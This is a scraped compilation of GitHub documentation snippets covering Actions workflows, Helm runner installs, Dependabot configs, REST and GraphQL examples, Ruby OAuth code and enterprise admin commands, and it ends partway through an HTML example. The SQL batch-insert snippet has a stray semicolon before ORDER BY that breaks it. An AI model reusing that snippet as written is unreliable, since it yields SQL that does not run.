https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst readline = require('readline');\n\nlet continueFlag = 'Y';\nlet finalBalance = 1000.00;\n\nconst rl = readline.createInterface({\n    input: process.stdin,\n    output: process.stdout\n});\n```\n\n----------------------------------------\n\nTITLE: Using Time-Zone Header with cURL\nDESCRIPTION: This code snippet demonstrates how to use the `Time-Zone` header in a cURL request to the GitHub REST API. The `Time-Zone` header specifies the timezone according to the Olson database, influencing the timestamp generated when the API call is made. It's used in API calls that create new data or modify existing data, such as managing repository contents.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/timezones-and-the-rest-api.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Time-Zone: Europe/Amsterdam\" -X POST {% data variables.product.rest_url %}/repos/github-linguist/linguist/contents/new_file.md\n```\n\n----------------------------------------\n\nTITLE: Installing Runner Scale Sets with Helm\nDESCRIPTION: This snippet demonstrates how to install runner scale sets using Helm, setting parameters like the installation name, namespace, GitHub configuration URL, and GitHub personal access token (PAT). It highlights how to customize the installation with your specific GitHub repository, organization, or enterprise and specifies a namespace for the runner pods.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"{% raw %}${INSTALLATION_NAME}{% endraw %}\" \\\n    --namespace \"{% raw %}${NAMESPACE}{% endraw %}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"{% raw %}${GITHUB_CONFIG_URL}{% endraw %}\" \\\n    --set githubConfigSecret.github_token=\"{% raw %}${GITHUB_PAT}{% endraw %}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set\n```\n\n----------------------------------------\n\nTITLE: Example JSON Treemap Data\nDESCRIPTION: This JSON snippet represents the format of the data required for creating a treemap using D3.js. Each object in the array contains a `name` and a `size` property, representing the language name and its corresponding byte count.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n[ { \"name\": \"language1\", \"size\": 100},\n  { \"name\": \"language2\", \"size\": 23}\n  ...\n]\n```\n\n----------------------------------------\n\nTITLE: Example Secret Scanning Request Body\nDESCRIPTION: This JSON snippet shows an example of the request body that GitHub sends to a service provider's endpoint when a secret match is found. It includes the token value, type of secret, URL where the secret was found, and the source of the secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"token\":\"NMIfyYncKcRALEXAMPLE\",\n    \"type\":\"mycompany_api_token\",\n    \"url\":\"https://github.com/octocat/Hello-World/blob/12345600b9cbe38a219f39a9941c9319b600c002/foo/bar.txt\",\n    \"source\":\"content\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Rolling back a patch release with ghe-upgrade\nDESCRIPTION: This snippet demonstrates how to roll back a patch release using the `ghe-upgrade` command with the `--allow-patch-rollback` switch. Before rolling back, replication must be temporarily stopped on all replica nodes. After the rollback is complete, replication needs to be restarted.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/troubleshooting-upgrades/restoring-from-a-failed-upgrade.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-repl-stop\nghe-upgrade --allow-patch-rollback\nghe-repl-start\n```\n\n----------------------------------------\n\nTITLE: Defining Dependent Jobs in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet shows how to define dependent jobs in a GitHub Actions workflow using the `needs` keyword. The `build` job depends on the `setup` job, and the `test` job depends on the `build` job. This ensures that jobs run in a specific order, where subsequent jobs only execute after the preceding job has completed successfully.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/about-workflows.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./setup_server.sh\n  build:\n    needs: setup\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./build_server.sh\n  test:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./test_server.sh\n```\n\n----------------------------------------\n\nTITLE: Publishing to GitHub Packages Workflow (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that publishes a Java package to GitHub Packages when a release is created. It uses the `setup-java` action to configure Maven and the `GITHUB_TOKEN` secret for authentication.  The workflow needs `contents: read` and `packages: write` permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-maven.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Publish package to GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Publish package\n        run: mvn --batch-mode deploy\n        env:\n          GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Pages Action\nDESCRIPTION: This snippet configures the GitHub Pages action within a workflow job to gather metadata about a website. It uses the `actions/configure-pages@v5` action.  This action supports deployment from any static site generator to GitHub Pages.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/using-custom-workflows-with-github-pages.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Configure GitHub Pages\n  uses: actions/configure-pages@v5\n```\n\n----------------------------------------\n\nTITLE: Querying Public Repositories by Organization without Enterprise Accounts API (GraphQL)\nDESCRIPTION: This GraphQL query demonstrates how to retrieve the number of public repositories in each organization without using the Enterprise Accounts API. It requires querying each organization separately, making it more complex than using the Enterprise Accounts API. Replace `<name-of-organization-one>` and `<name-of-organization-two>` with the actual organization names.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/managing-enterprise-accounts.md#_snippet_1\n\nLANGUAGE: GraphQL\nCODE:\n```\n# Each organization is queried separately\n{\n  organizationOneAlias: organization(login: \"nameOfOrganizationOne\") {\n    # How to use a fragment\n    ...repositories\n  }\n  organizationTwoAlias: organization(login: \"nameOfOrganizationTwo\") {\n    ...repositories\n  }\n  # organizationThreeAlias ... and so on up-to lets say 100\n}\n\n## How to define a fragment\nfragment repositories on Organization {\n  name\n  repositories(privacy: PUBLIC){\n    totalCount\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Pull Request Events (Ruby)\nDESCRIPTION: This code snippet extends the basic Sinatra application to specifically handle `pull_request` events. It checks the `X-GitHub-Event` HTTP header to identify pull request events. Upon receiving a pull request event with the action \"opened\", it calls the `process_pull_request` helper method to process the pull request data.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/building-a-ci-server.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\npost '/event_handler' do\n  @payload = JSON.parse(params[:payload])\n\n  case request.env['HTTP_X_GITHUB_EVENT']\n  when \"pull_request\"\n    if @payload[\"action\"] == \"opened\"\n      process_pull_request(@payload[\"pull_request\"])\n    end\n  end\nend\n\nhelpers do\n  def process_pull_request(pull_request)\n    puts \"It's #{pull_request['title']}\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Referencing Kubernetes Secret in values.yaml\nDESCRIPTION: This YAML snippet shows how to reference the previously created Kubernetes secret in the `values.yaml` file of the Actions Runner Controller Helm chart. The `githubConfigSecret` parameter is set to 'pre-defined-secret', which tells the controller where to find the GitHub PAT.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/authenticating-to-the-github-api.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ngithubConfigSecret: pre-defined-secret\n```\n\n----------------------------------------\n\nTITLE: Creating a precompiled Go extension\nDESCRIPTION: Creates a Go-based extension project using `gh extension create` with the `--precompiled=go` flag. Replace `EXTENSION-NAME` with the extension's name. This sets up the project with Go scaffolding, workflow files, and starter code for a precompiled extension.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension create --precompiled=go EXTENSION-NAME\n```\n\n----------------------------------------\n\nTITLE: Enabling NES using ghe-config\nDESCRIPTION: This snippet demonstrates how to enable the Node Eligibility Service (NES) in a GitHub Enterprise Server cluster using the `ghe-config` command. It sets the `app.nes.enabled` configuration setting to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.nes.enabled true\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with Combined ifversion Blocks\nDESCRIPTION: This snippet demonstrates a combination of nested and sequential `ifversion` checks.  It first checks if `fpt` is true and, if so, renders 'Alpha' and then checks if the GHES version is less than 2.14, and if so, renders 'Bravo'. If `fpt` is false, it renders 'Charlie'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% ifversion ghes < 2.14 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Quick Commands in devcontainer.json\nDESCRIPTION: This snippet shows how to define build, run, and test commands within the `.devcontainer/devcontainer.json` file for a GitHub repository.  This allows users of GitHub Copilot Workspace to easily execute these commands. The snippet assumes that a `.devcontainer/devcontainer.json` file exists, or that one is being created.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/using-github-copilot-for-pull-requests/using-copilot-to-help-you-work-on-a-pull-request.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"commands\": {\n    \"Build\": \"make\",\n    \"Run\": \"./bin/start\",\n    \"Test\": \"make test\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Listing issues with specific criteria using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to use the `gh issue list` command to search for issues based on criteria such as no assignee and specific labels. The results are sorted by creation date in ascending order. Requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/filtering-and-searching-issues-and-pull-requests.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh issue list --search 'no:assignee label:\"help wanted\",bug sort:created-asc'\n```\n\n----------------------------------------\n\nTITLE: Set system-level Git configuration value (shell)\nDESCRIPTION: This command sets a specified Git configuration value at the system level, which applies to all users on the system. This allows overriding user-specific or global settings with a system-wide default, for example, setting the `gpg.program` after removing it from the global configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-gpg-verification-for-github-codespaces.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit config --system gpg.program gpg2\n```\n\n----------------------------------------\n\nTITLE: Generating Mannequin CSV with ado2gh extension (GitHub CLI)\nDESCRIPTION: This command generates a CSV file with a list of mannequins for a specified GitHub organization when the migration source is Azure DevOps. The CSV file is used for bulk mannequin reclamation. Replace DESTINATION with the target GitHub organization and FILENAME.csv with the desired output file name.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh ado2gh generate-mannequin-csv --github-org DESTINATION --output FILENAME.csv\n```\n\n----------------------------------------\n\nTITLE: Cloning a Git Repository\nDESCRIPTION: This command clones a Git repository from a remote URL to your local machine. The URL should be replaced with the actual repository URL.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://{% data variables.product.product_url %}/YOUR-USERNAME/YOUR-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Searching models by input tokens greater than on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models with an input token limit greater than 10,000 using the `input-tokens` qualifier with the `>` operator.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_12\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=input-tokens:%3E10000&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Grouping log lines in YAML using Bash\nDESCRIPTION: This snippet shows how to group log lines within a GitHub Actions workflow using the `group` and `endgroup` commands in Bash.  This allows for creating expandable sections in the workflow log.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  bash-example:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Group of log lines\n        run: |\n            echo \"::group::My title\"\n            echo \"Inside group\"\n            echo \"::endgroup::\"\n```\n\n----------------------------------------\n\nTITLE: Testing SSH Configuration - Bash\nDESCRIPTION: This command tests the updated SSH configuration to verify that connections to {% data variables.location.product_location %} are now routed through port 443.  It attempts to connect to GitHub using the `git@{% data variables.product.product_url %}` address. The output indicates successful authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/using-ssh-over-the-https-port.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ ssh -T git@{% data variables.product.product_url %}\n# Hi USERNAME! You've successfully authenticated, but GitHub does not\n# provide shell access.\n```\n\n----------------------------------------\n\nTITLE: Resolving QL Reference Files using CodeQL CLI in Shell\nDESCRIPTION: This command dereferences a .qlref file to find the corresponding .ql file. It accepts a .qlref file as input and returns the path to the dereferenced .ql file.  The `<qlref>` argument is mandatory and specifies the path to the .qlref file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-qlref.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql resolve qlref <options>... -- <qlref>\n```\n\n----------------------------------------\n\nTITLE: Axe Result Example: Target, Tags - Shell\nDESCRIPTION: This code snippet showcases the 'target' and 'tags' fields in Axe test results.  'target' is a CSS selector pointing to the element with the accessibility failure, and 'tags' provides information about the severity and related WCAG success criteria. This helps in quickly locating and categorizing accessibility issues.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/axe.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n# Example 5\n    +         \"target\": Array [\n    +           \".ghd-tool > table > thead > tr > th[scope=\\\"col\\\"]:nth-child(1)\",\n\t\t    + ]\n\t+     \"tags\": Array [\n    +       \"cat.name-role-value\",\n    +       \"best-practice\",\n    +     ],\n\n# Example 6\n    +         \"target\": Array [\n    +           \".List__ListBox-sc-1x7olzq-0\",\n    +         ],\n    +     \"tags\": Array [\n    +       \"cat.structure\",\n    +       \"wcag2a\",\n    +       \"wcag131\",\n    +     ]\n```\n\n----------------------------------------\n\nTITLE: Configuring Bundler with username and password\nDESCRIPTION: This snippet demonstrates how to configure Dependabot to authenticate with a private RubyGems server using a username and password in the `dependabot.yml` file. It specifies the registry type, URL, username, and password (stored as a secret).\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  ruby-example:\n    type: rubygems-server\n    url: https://rubygems.example.com\n    username: octocat@example.com\n    password: ${{secrets.MY_RUBYGEMS_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Batch Processing Data Insertion in SQL\nDESCRIPTION: This SQL snippet implements batch processing for inserting data from `source_table` to `target_table`, breaking down a potentially long-running transaction into smaller batches.  This helps prevent blocking and improves overall database performance. Dependencies: `source_table` and `target_table` must pre-exist. A primary key column is required in source_table.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nDECLARE @BatchSize INT = 1000;\nDECLARE @Offset INT = 0;\nDECLARE @RowCount INT;\n\nSET @RowCount = @BatchSize;\n\nWHILE @RowCount = @BatchSize\nBEGIN\n    BEGIN TRANSACTION;\n\n    INSERT INTO target_table (first_name, last_name, email, dept, role, hire_date)\n    SELECT first_name, last_name, email, department, job_title, start_date\n    FROM source_table\n    WHERE (department = 'Engineering' AND salary > 95000)\n       OR (department = 'Engineering' AND years_of_experience > 5)\n       OR (department = 'Marketing' AND performance_rating = 'Excellent');\n    ORDER BY primary_key_column\n    OFFSET @Offset ROWS FETCH NEXT @BatchSize ROWS ONLY;\n\n    SET @RowCount = @@ROWCOUNT;\n    SET @Offset = @Offset + @BatchSize;\n\n    COMMIT;\nEND;\n```\n\n----------------------------------------\n\nTITLE: Installing Playwright Browsers\nDESCRIPTION: This command installs or updates the browser binaries required by Playwright, ensuring compatibility with the installed Playwright version.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nnpx playwright install\n```\n\n----------------------------------------\n\nTITLE: Execute Git Blame on a Specific Line\nDESCRIPTION: This command executes the `git blame` command to show the blame information for a specific line (line 1) in the `README.md` file.  It relies on Git being installed and available in the shell. The `-L 1,1` option limits the output to only line 1.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/getting-started-with-git.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit blame -L 1,1 README.md\n```\n\n----------------------------------------\n\nTITLE: Configuring Settings with ghe-config - Shell\nDESCRIPTION: This snippet demonstrates the `ghe-config` utility, which is used to retrieve and modify configuration settings of GitHub Enterprise Server. It can retrieve specific configuration values, set new values, and list all configuration values. It also shows how to retrieve the UUID and exempt users from rate limits.  Requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-config core.github-hostname\n# Gets the configuration value of `core.github-hostname`\n$ ghe-config core.github-hostname URL\n# Sets the configuration value of `core.github-hostname`\n# to the specified URL\n$ ghe-config -l\n# Lists all the configuration values\n```\n\nLANGUAGE: shell\nCODE:\n```\n  ghe-config HOSTNAME.uuid\n```\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-config app.github.rate-limiting-exempt-users \"hubot github-actions[bot]\"\n# Exempts the users hubot and github-actions[bot] from rate limits.\n# Usernames are case-sensitive.\n```\n\n----------------------------------------\n\nTITLE: Using labels to control runner selection (Windows)\nDESCRIPTION: This YAML snippet shows how to use labels within the `runs-on` key of a GitHub Actions workflow to target a specific runner with the `windows-2022-16core` label. The workflow checks the version of bats. It utilizes actions for checkout and node setup, and then installs and executes bats.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/using-larger-runners/running-jobs-on-larger-runners.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      labels: windows-2022-16core\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n----------------------------------------\n\nTITLE: Yarn Berry: Updating resolved field in yarn.lock\nDESCRIPTION: This snippet demonstrates how the `resolved` field in a `yarn.lock` file should look when a private registry is correctly configured. It shows the URL of the private registry being used to resolve a specific dependency.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nencoding@^0.1.11:\n  version \"0.1.13\"\n  resolved \"https://private_registry_url/encoding/-/encoding-0.1.13.tgz#56574afdd791f54a8e9b2785c0582a2d26210fa9\"\n  integrity sha512-ETBauow1T35Y/WZMkio9jiM0Z5xjHHmJ4XmjZOq1l/dXz3lr2sRn87nJy20RupqSh1F2m3HHPSp8ShIPQJrJ3A==\n  dependencies:\n    iconv-lite \"^0.6.2\"\n```\n\n----------------------------------------\n\nTITLE: Configuring ECR access using AWS Access Key and Secret Key (Shell)\nDESCRIPTION: This snippet demonstrates how to configure access to AWS Elastic Container Registry (ECR) by providing AWS access key ID and secret key. The *_CONTAINER_REGISTRY_SERVER variable should be set to the ECR URL, *_CONTAINER_REGISTRY_USER should be set to the AWS access key ID, and *_CONTAINER_REGISTRY_PASSWORD should be set to the AWS secret key. Requires appropriate IAM permissions for credential swap and ECR read operation.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/reference/allowing-your-codespace-to-access-a-private-registry.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n*_CONTAINER_REGISTRY_SERVER = <ECR_URL>\n*_CONTAINER_REGISTRY_USER = <AWS_ACCESS_KEY_ID>\n*_CONTAINER_REGISTRY_PASSWORD = <AWS_SECRET_KEY>\n```\n\n----------------------------------------\n\nTITLE: Defining pip Versioning Strategy: Increase If Necessary\nDESCRIPTION: This YAML snippet configures Dependabot to increase the minimum version requirement for pip dependencies only if the original constraint does not allow the new version. It sets `versioning-strategy` to `increase-if-necessary` within the `dependabot.yml` file for the pip package ecosystem. It also configures `open-pull-requests-limit` and `rebase-strategy`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n- package-ecosystem: pip\n  directory: \"/\"\n  schedule:\n    interval: daily\n  open-pull-requests-limit: 20\n  rebase-strategy: \"disabled\"\n  # Increase the version requirements for npm\n  # only when required\n  versioning-strategy: increase-if-necessary\n```\n\n----------------------------------------\n\nTITLE: Updating Callback Handler for Token Exchange in Ruby\nDESCRIPTION: This code updates the callback URL handler to exchange the authorization code for a user access token using the `exchange_code` function. It checks if the token exchange was successful and displays a success or failure message accordingly. If successful, it displays the last 9 characters of the access token.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nget \"CALLBACK_URL\" do\n  code = params[\"code\"]\n\n  token_data = exchange_code(code)\n\n  if token_data.key?(\"access_token\")\n    token = token_data[\"access_token\"]\n\n    render = \"Successfully authorized! Got code #{code} and exchanged it for a user access token ending in #{token[-9..-1]}.\"\n    erb render\n  else\n    render = \"Authorized, but unable to exchange code #{code} for token.\"\n    erb render\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Importing Dependencies in Ruby\nDESCRIPTION: This snippet imports the necessary libraries for the Sinatra web framework, loading environment variables using dotenv, making HTTP requests with net/http, and parsing JSON data. Sinatra handles the web server aspects, dotenv loads configuration from a `.env` file, net/http is used for making API requests, and json is used to handle JSON formatted data.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"sinatra\"\nrequire \"dotenv/load\"\nrequire \"net/http\"\nrequire \"json\"\n```\n\n----------------------------------------\n\nTITLE: Authenticating with GITHUB_TOKEN from env in JavaScript\nDESCRIPTION: This snippet demonstrates how to authenticate with the {% data variables.product.company_short %} REST API using the `GITHUB_TOKEN` stored in an environment variable, within a {% data variables.product.prodname_actions %} workflow. It initializes an `Octokit` instance with the `auth` parameter set to `process.env.TOKEN`.{% ifversion ghes %}Replace `HOSTNAME` with the name of {% data variables.location.product_location %}.{% endif %}\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { Octokit } from \"octokit\";\n\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n  auth: process.env.TOKEN,\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Person Class and Age Retrieval in JavaScript\nDESCRIPTION: This JavaScript code defines a `Person` class with `name` and `age` properties. It then uses an object to store `Person` instances and provides functions to add a person and retrieve their age. This snippet demonstrates basic object creation and manipulation.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-to-implement-a-design-pattern.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nclass Person {\n  constructor(name, age) {\n    this.name = name;\n    this.age = age;\n  }\n}\n\nvar people = {};\n\nfunction addPerson(name, age) {\n  people[name] = new Person(name, age);\n}\n\nfunction getAge(name) {\n  if (people[name]) {\n    console.log(name + \" is \" + people[name].age + \" years old.\");\n  } else {\n    console.log(\"Person not found.\");\n  }\n}\n\naddPerson(\"Ana\", 30);\naddPerson(\"Mario\", 25);\naddPerson(\"Louise\", 40);\n\ngetAge(\"Mario\");\n```\n\n----------------------------------------\n\nTITLE: Filtering Workflow Runs with Branches in YAML\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to run on pushes to specific branches, including the use of the `!` character to exclude certain branches that match a given pattern. The workflow will run on pushes to `releases/10` or `releases/beta/mona`, but not on `releases/10-alpha` or `releases/beta/3-alpha` because the negative pattern `!releases/**-alpha` follows the positive pattern `releases/**`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/run-on-specific-branches-or-tags4.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'\n```\n\n----------------------------------------\n\nTITLE: Stopping and Starting Workflow Commands (PowerShell)\nDESCRIPTION: This YAML snippet demonstrates how to disable and re-enable workflow commands using the `stop-commands` command in a PowerShell context. A GUID is generated as the token, then used to stop and restart command processing, preventing accidental execution of commands within the logged output.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  workflow-command-job:\n    runs-on: windows-latest\n    steps:\n      - name: Disable workflow commands\n        run: |\n          Write-Output '::warning:: This is a warning message, to demonstrate that commands are being processed.'\n          $stopMarker = New-Guid\n          Write-Output \"::stop-commands::$stopMarker\"\n          Write-Output '::warning:: This will NOT be rendered as a warning, because stop-commands has been invoked.'\n          Write-Output \"::$stopMarker::\"\n          Write-Output '::warning:: This is a warning again, because stop-commands has been turned off.'\n```\n\n----------------------------------------\n\nTITLE: Building with Gradle using a custom build file\nDESCRIPTION: This snippet shows how to customize the Gradle build process by specifying a custom Gradle build file (`ci.gradle`) and a specific task (`package`).  It sets up the environment and then executes the specified Gradle task. The workflow expects a `ci.gradle` file to be present in the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - name: Setup Gradle\n    uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n  - name: Build with Gradle\n    run: ./gradlew -b ci.gradle package\n```\n\n----------------------------------------\n\nTITLE: Yarn Lockfile Example\nDESCRIPTION: This is an example of a `yarn.lock` file entry showing a dependency resolved from a private registry. It illustrates how Yarn updates the resolved field to include the private registry URL after running `yarn install` with proper access.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_22\n\nLANGUAGE: Shell\nCODE:\n```\nencoding@^0.1.11:\n  version \"0.1.13\"\n  resolved \"https://private_registry_url/encoding/-/encoding-0.1.13.tgz#56574afdd791f54a8e9b2785c0582a2d26210fa9\"\n  integrity sha512-ETBauow1T35Y/WZMkio9jiM0Z5xjHHmJ4XmjZOq1l/dXz3lr2sRn87nJy20RupqSh1F2m3HHPSp8ShIPQJrJ3A==\n  dependencies:\n    iconv-lite \"^0.6.2\"\n```\n\n----------------------------------------\n\nTITLE: Adding a responsive image using HTML\nDESCRIPTION: This snippet demonstrates how to add a responsive image to your profile README using the HTML `<picture>` element and `prefers-color-scheme` media feature. This allows the image to change based on the user's light or dark mode preference. Requires image URLs for dark mode, light mode, and a default image. Also requires alt text for accessibility.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<picture>\n <source media=\"(prefers-color-scheme: dark)\" srcset=\"YOUR-DARKMODE-IMAGE\">\n <source media=\"(prefers-color-scheme: light)\" 